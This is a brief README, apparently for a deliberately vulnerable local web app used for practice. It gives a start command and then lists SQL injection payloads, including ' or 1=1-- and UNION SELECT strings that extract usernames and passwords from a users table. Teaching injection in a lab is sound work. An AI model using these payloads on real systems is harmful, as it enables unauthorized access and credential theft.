## Get started
```bash
python3 main.py
```
Go to `http://localhost:8080`

## Possible SQL injections
- `user1' or name='user2' or name='user3'--`
- `' or 1=1--`
- `' union select 1--`
- `' union select password from users--`
- `' union select name || ':' || password from users--`
